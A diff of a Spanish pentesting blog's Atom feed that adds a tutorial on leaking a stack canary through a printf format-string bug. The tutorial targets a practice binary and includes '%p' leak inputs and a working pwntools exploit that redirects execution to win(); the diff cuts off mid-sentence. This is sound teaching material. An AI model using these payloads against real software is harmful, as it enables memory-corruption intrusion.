@@ -1,4 +1,241 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-01T18:48:12-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">IOF - Integer Overflow/Underflow</title><link href="http://localhost:4000/integer-overflow/" rel="alternate" type="text/html" title="IOF - Integer Overflow/Underflow" /><published>2022-08-01T00:00:00-05:00</published><updated>2022-08-01T00:00:00-05:00</updated><id>http://localhost:4000/integer-overflow</id><content type="html" xml:base="http://localhost:4000/integer-overflow/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-08-03T19:18:54-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">Leak stack canary - bypass</title><link href="http://localhost:4000/leak-stack-canary/" rel="alternate" type="text/html" title="Leak stack canary - bypass" /><published>2022-08-03T00:00:00-05:00</published><updated>2022-08-03T00:00:00-05:00</updated><id>http://localhost:4000/leak-stack-canary</id><content type="html" xml:base="http://localhost:4000/leak-stack-canary/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Que es el stack canary y como funciona&lt;/li&gt;
+  &lt;li&gt;Analizando el binario&lt;/li&gt;
+  &lt;li&gt;Lekeando el canary&lt;/li&gt;
+  &lt;li&gt;Sacando el offset del canary&lt;/li&gt;
+  &lt;li&gt;Ejecutando nuestro exploit&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;que-es-el-stack-canary-y-como-funciona&quot;&gt;Que es el stack canary y como funciona&lt;/h2&gt;
+
+&lt;p&gt;El stack canary es un valor random que se genera en el stack y cambia cada vez que se ejecuta un programa, y antes de que se ejecute el return adress el programa comprueba si el canary que se definio por defecto es igual que tiene antes de ejecutar el ret, donde si es diferente la ejecucion del programa se detiene. El canary se encuentra entre el buffer y el rbp y ret , de esta manera:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|----------|
+|    ret   |
+|----------|
+|    rbp   |
+|----------|
+|  canary  |
+|----------|
+|  buffer  |
+|----------|
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Como se puede ver, el canary esta entre el ebp y el buffer. Si buscaron en internet antes y les salio que el canary esta entre el buffer y el ret, osea de esta forma tambien es correcto.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|----------|
+|    ret   |
+|----------|
+|  canary  |
+|----------|
+|  buffer  |
+|----------|
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;analizando-el-binario&quot;&gt;Analizando el binario&lt;/h2&gt;
+
+&lt;p&gt;El binario es un ejercicio propuesto por ir0nstone&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Leak me&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Overflow me&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;You won!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;En la funcion vuln tenemos un buffer de 64, despues tenemos un puts, y despues un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt;, este gets sirve para guardar nuestro input, despues con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; imprimimos ese input, de primeras se esta usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; sin pasarle ningun format string, asi que sabiendo eso el programa es vulnerable a format string, por ultimo tenemos otros puts y gets, pasaremos a mostrar las protecciones del binario y nos muestra esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Hay dos que estan activadas y vemos que una de ellas es NX, asi que no podemos ejecutar una shellcode, la otra es el Canary que ya explique que era. Asi que haremos lo siguiente&lt;/p&gt;
+
+&lt;h3 id=&quot;nuestro-plan&quot;&gt;Nuestro plan&lt;/h3&gt;
+
+&lt;p&gt;Para esta practica nos aprovecharemos de la vulnerabilidad format string para lekear el valor del canary, asi que cuando lanzemos nuestro exploit y ocasionemos el buffer overflow el canary lo vamos a sobreescribir por el mismo asi que el programa no va a parar su ejecucion y nos mostrara el mensaje &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;You won!&lt;/code&gt;. Ahora pasare a la parte del debugging&lt;/p&gt;
+
+&lt;p&gt;Primeramente usare radare2 ya que se me hace mas comodo y depues usare gdb con gef.&lt;/p&gt;
+
+&lt;p&gt;Ya se la saben banda, metemos el binario a radare, analizamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aaa&lt;/code&gt;, nos vamos el main con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s main&lt;/code&gt; y lo mostramos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pdf&lt;/code&gt;, vemos esto&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/radare1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aqui realmente no hay nada interesante, mas que nada una llamada a la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vuln&lt;/code&gt;, asi que ahora nos moveremos para alla con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s sym.vuln&lt;/code&gt; y la mostraremos, vemos en la parte de arriba como se estan declarando dos variables de esta forma:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;var int64_t canary @ rbp-0x8
+var char *format @ rbp-0x50
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;La primera es el canary que se genero automaticamente, este se encuentra en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp-0x8&lt;/code&gt; por debajo del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rbp&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Y la otra es format que solo es el format string que recibira el printf.
+Ahora pasare a esta parte:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/radare2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;La primera instruccion mueve el valor que se genero del Canary a rax&lt;/li&gt;
+  &lt;li&gt;La segunda mueve lo que tiene rax a canary&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bajare un poco mas para mostrar por que es vulnerable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt;a format string&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/radare3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Simplemente cuando se hace el llamado de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; no se le pasa para que reciba ningun format string, entonces por consiguiente podemos lekear valores de la memoria.&lt;/p&gt;
+
+&lt;p&gt;Pasare a mostrar la parte donde se hace la comprobacion del canary&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/radare4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Lo primero que tenemos es una operacion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov&lt;/code&gt;, donde mueve el valor que tiene el canary antes de llegar al ret y lo mueve a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Despues tenemos una operacion de resta donde resta del valor del canary que se le asigno por defecto por el valor que tiene &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Por ultimo tememos un salto condicional donde si es igual a 0, osea que ambos canaries son iguales se salta al bloque true, y si son diferentes el programa termina.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Hay que ver que en el bloque true tenemos el ret, ya que el flujo del programa siguio correctamente&lt;/p&gt;
+
+&lt;h2 id=&quot;lekeando-el-canary&quot;&gt;Lekeando el canary&lt;/h2&gt;
+
+&lt;h3 id=&quot;visualizando-el-canary-en-radare2&quot;&gt;Visualizando el canary en radare2&lt;/h3&gt;
+
+&lt;p&gt;Antes de lekearlo con format string, mostrare el stack para que ven el valor del canary que hay que lekear, para eso pondre un breakpoint donde se hace el llamado a la funcion printf en la funcion vuln, aqui:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x00401192      e8b9feffff     call sym.imp.printf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si continuamos la ejecucion del programa con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dc&lt;/code&gt; e ingresamos cualquier input y mostramos el stack con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pxr @ rsp&lt;/code&gt; vemos esto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/radare5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Primeramente vemos nuestro input, que en mi caso fue &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%p&lt;/code&gt; y un poco mas abajo esta el canary, que es el que tengo seleccionado, se que es el canary ya que normalmente los canary terminan con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00&lt;/code&gt; y no inician con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;f7&lt;/code&gt; o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ff&lt;/code&gt; y si vemos el canary que me salio a mi que fue &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0f36062cc7d73900&lt;/code&gt; tiene todas las caracteristicas que menciono&lt;/p&gt;
+
+&lt;h3 id=&quot;lekeando-el-canary-con-format-string&quot;&gt;Lekeando el canary con format string&lt;/h3&gt;
+
+&lt;p&gt;Realmente para lekear el canary normalmente se usa fuzzing ya que es mas sencillo y todo automatico, pero nosotros le pasaremos los format strings al input del binario.&lt;/p&gt;
+
+&lt;p&gt;Al primer input le pasare todo esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;El resultado de este input me dio esto:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/canary.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y como se puede ver el valor que tengo seleccionado es el canary, y se que es ese por lo que mencione antes, ahora pasare a mostrar directamente lo que se encuentra en esa posicion para corroborar que si sea el canary&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/canary2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como vemos si mostrarmos esa posicion que es la 15 nos muesta el canary, lo ejecute dos veces para ver si realmente era esa.&lt;/p&gt;
+
+&lt;p&gt;Asi que el canary se encuentra en la posicion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;15&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;sacando-el-offset-del-canary&quot;&gt;Sacando el offset del canary&lt;/h2&gt;
+
+&lt;p&gt;Para sacar su offset me ire a gdb y usare gef, una vez ahi mostrare del contenido de la funcion vuln y se ve algo asi:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/gdb.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No me detendre a explicar ya que es lo mismo que vimos en radare simplemente aqui pondre dos breakpoint aqui&lt;/p&gt;
+
+&lt;p&gt;El primero es aqui&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x0000000000401163 &amp;lt;+17&amp;gt;:	mov    QWORD PTR [rbp-0x8],rax
+
+   Este breakpoint lo puse aqui ya que es la parte donde el canary se encuentra en rax
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El segundo es aqui&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   0x00000000004011c5 &amp;lt;+115&amp;gt;:	sub    rax,QWORD PTR fs:0x28
+
+   Que es donde se hace la resta de ambos canaries
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora si ejecutamos el programa y mostramos el contenido del registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rax&lt;/code&gt; de esta forma &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/gx $rax&lt;/code&gt; podemos ver esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  x/gc $rax
+0x4eb24e58c0443400:	Cannot access memory at address 0x4eb24e58c0443400
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Vemos como el valor del canary que se genero por defecto es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x4eb24e58c0443400&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora ahi mismo en gef generare 100 caracteres de esta forma &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patter create 100&lt;/code&gt; que nos servira para calcular el offset y se los pasare al binario como nuestro primer input. Y mostramos otra vez el valor de rax, vemos esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  x/gc $rax
+0x616161616161616a:	Cannot access memory at address 0x616161616161616a
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora nuestro canary vale &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x616161616161616a&lt;/code&gt; se ha sobreescrito, pero esto es lo que queremos ya que ahora con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;patter offset 0x616161616161616a&lt;/code&gt; podemos calcular su offset y nos muestra esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  patter offset 0x616161616161616a
+[+] Searching for '0x616161616161616a'
+[+] Found at offset 72 (little-endian search) likely
+[+] Found at offset 65 (big-endian search) 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Y ahi lo tenemos, el offset del canary es 72, ahora si continuo la ejecucion del programa con los canaries diferentes podemos ver algo como esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  c
+Continuing.
+*** stack smashing detected ***: terminated
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;El programa se detiene ya que los canaries con diferentes.&lt;/p&gt;
+
+&lt;h2 id=&quot;ejecutando-nuestro-exploit&quot;&gt;Ejecutando nuestro exploit&lt;/h2&gt;
+
+&lt;p&gt;El exploit queda de esta manera&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./vuln-64&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'%15$p'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#posicion del canary
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Canary: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# offset el canary
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# padding para llegar al ret
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x004011ec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#ret que en este caso es la direccion de la funcion win()
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y listo&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/pwn.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/leak-stack-canary/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="Explotacion binaria" /><category term="formatStr" /><category term="radare2" /><summary type="html">En este articulo veras como puedes hacer bypass del stack canary lekeandolo usando format strings</summary></entry><entry><title type="html">IOF - Integer Overflow/Underflow</title><link href="http://localhost:4000/integer-overflow/" rel="alternate" type="text/html" title="IOF - Integer Overflow/Underflow" /><published>2022-08-01T00:00:00-05:00</published><updated>2022-08-01T00:00:00-05:00</updated><id>http://localhost:4000/integer-overflow</id><content type="html" xml:base="http://localhost:4000/integer-overflow/">&lt;h2 id=&quot;contenido&quot;&gt;Contenido&lt;/h2&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Integer Overflow y underflow&lt;/li&gt;
@@ -63,7 +300,7 @@
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/integer-overflow/radare4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Lo que hace es hacer una operacion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add&lt;/code&gt; osea una suma, y esta sumando el valor almacenado de nuestro primer input que esta en la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_14h&lt;/code&gt; con nuestro segundo input que esta en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10h&lt;/code&gt; y lo almacena en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_ch&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Lo primero que hace es mover el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_14&lt;/code&gt; a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edx&lt;/code&gt; y el valor de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10&lt;/code&gt; a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; despues lo que hace es hacer una operacion de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add&lt;/code&gt; osea una suma, y esta sumando el valor almacenado de nuestro primer input que esta en la variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_14h&lt;/code&gt; y que se paso a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edx&lt;/code&gt; con nuestro segundo input que esta en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;var_10h&lt;/code&gt; y que se paso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eax&lt;/code&gt; y el resultado lo almacena 